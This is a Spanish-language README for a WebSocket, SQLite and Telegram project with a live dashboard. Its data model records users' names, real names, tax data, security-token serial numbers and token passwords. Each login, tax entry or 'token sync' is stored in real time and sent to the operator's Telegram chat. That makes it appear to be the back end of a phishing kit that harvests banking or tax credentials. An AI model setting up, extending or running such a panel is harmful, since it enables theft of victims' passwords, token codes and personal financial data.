# Sistema WebSocket con SQLite y Telegram

## Instalación

1. Instalar dependencias del proyecto principal:
```bash
npm install
```

2. Instalar dependencias del servidor WebSocket:
```bash
cd server
npm install
cd ..
```

**Nota importante**: `better-sqlite3` requiere compilación nativa. Si tienes problemas en Windows, puedes necesitar:
- Python 2.7 o 3.x
- Visual Studio Build Tools
- O usar `npm install --build-from-source`

## Ejecución

### Opción 1: Ejecutar todo junto (recomendado)
```bash
npm run dev:all
```

Esto ejecutará tanto el servidor Vite (puerto 3000) como el servidor WebSocket (puerto 3002) simultáneamente.

### Opción 2: Ejecutar por separado

Terminal 1 - Servidor Vite:
```bash
npm run dev
```

Terminal 2 - Servidor WebSocket:
```bash
npm run ws
```

## Configuración de Telegram

1. **Obtener Token del Bot**:
   - Abre Telegram y busca `@BotFather`
   - Envía `/newbot` y sigue las instrucciones
   - Copia el token que te proporciona (formato: `123456789:ABCdefGHIjklMNOpqrsTUVwxyz`)

2. **Obtener Chat ID**:
   - Busca `@userinfobot` en Telegram
   - Envía cualquier mensaje
   - Copia tu Chat ID (número)

3. **Configurar en el Dashboard**:
   - Ve a `http://localhost:3000/dashboard`
   - Haz clic en "Configurar Telegram"
   - Ingresa el Token del Bot y el Chat ID
   - Haz clic en "Guardar Configuración"
   - Recibirás un mensaje de confirmación en Telegram

## Base de Datos SQLite

La base de datos se crea automáticamente en `server/sessions.db` con las siguientes tablas:

- **sessions**: Información básica de cada sesión
- **tax_data**: Datos fiscales de los usuarios
- **token_data**: Datos de sincronización de tokens
- **config**: Configuración del sistema (tokens de Telegram)

Los datos se guardan en tiempo real conforme los usuarios los ingresan.

## Funcionalidades

- ✅ Actualización en tiempo real de todas las sesiones
- ✅ Guardado automático en SQLite
- ✅ Notificaciones a Telegram en tiempo real
- ✅ Broadcast de nuevas sesiones a todos los clientes conectados
- ✅ Analytics en tiempo real
- ✅ Configuración de Telegram desde el dashboard
- ✅ Persistencia de datos entre reinicios del servidor
- ✅ Optimización de escrituras a la base de datos

## Dashboard

Accede al dashboard en: `http://localhost:3000/dashboard`

El dashboard mostrará:
- Todas las sesiones activas en tiempo real
- Analytics actualizados automáticamente
- Indicador de estado de conexión WebSocket
- Tabla completa con todos los datos de sesión
- Panel de configuración de Telegram
- Cada sesión incluye su ID único para identificación

## Notificaciones de Telegram

Cuando un usuario:
- Inicia sesión
- Completa datos fiscales
- Sincroniza un token

Recibirás una notificación en Telegram con:
- ID de sesión único
- Datos del usuario
- Tipo de acción realizada
- Fecha y hora

## Estructura de Datos

Cada sesión incluye:
- `sessionId`: ID único de la sesión (formato: `session_1234567890`)
- `userName`: Nombre de usuario
- `realName`: Nombre real
- `taxData`: Objeto con datos fiscales (si aplica)
- `tokenSerial`: Número de serie del token (si aplica)
- `tokenPasswords`: Contraseñas del token (si aplica)
- `timestamp`: Fecha de creación
- `lastUpdate`: Última actualización
